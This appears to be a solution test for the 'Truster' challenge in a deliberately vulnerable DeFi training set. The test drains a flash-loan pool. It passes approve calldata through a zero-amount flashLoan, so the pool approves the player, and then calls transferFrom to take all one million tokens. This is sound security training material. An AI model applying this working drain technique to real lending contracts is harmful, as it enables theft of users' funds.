// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../src/truster/TrusterLenderPool.sol";

contract Truster is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    DamnValuableToken token;
    TrusterLenderPool pool;

    uint256 public constant TOKENS_IN_POOL = 1_000_000 * 1e18;

    function setUp() public {
        vm.startPrank(deployer);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        deal(address(token), deployer, TOKENS_IN_POOL);
        assertEq(address(pool.token()), address(token));
        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
        vm.stopPrank();
    }

    function test_all_tokens_removed_from_pool() public {
        vm.startPrank(player);
        bytes memory data = abi.encodeCall(token.approve, (player, TOKENS_IN_POOL));
        pool.flashLoan(0, player, address(token), data);
        token.transferFrom(address(pool), player, TOKENS_IN_POOL);
        vm.stopPrank();

        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
